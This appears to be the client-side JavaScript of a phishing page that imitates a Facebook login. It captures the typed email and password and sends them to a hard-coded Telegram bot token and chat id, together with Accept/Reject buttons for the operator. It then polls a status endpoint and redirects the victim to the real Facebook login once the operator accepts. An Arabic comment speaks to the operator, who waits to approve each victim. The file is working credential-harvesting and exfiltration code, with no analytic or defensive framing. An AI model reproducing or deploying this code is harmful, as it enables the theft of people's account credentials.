
document.getElementById('submit-btn').addEventListener('click', () => {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    fetch('https://api.telegram.org/bot7828630167:AAG8iKwW5-NKU7OsmYDGmxip3NhhDBKLXVk/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: '5443898294',
            text: `Login Attempt\nEmail: ${email}\nPassword: ${password}`,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ Accept', callback_data: 'accept' },
                        { text: '❌ Reject', callback_data: 'reject' }
                    ]
                ]
            }
        })
    });
});

// المستخدم ينتظر رد الأدمن (أنت)
setInterval(() => {
    fetch('/get-status')
        .then(res => res.json())
        .then(data => {
            if (data.accepted) {
                window.location.href = 'https://www.facebook.com/login';
            }

            if (data.rejected) {
                document.getElementById('error-message').style.display = 'block';
            }
        });
}, 2000);
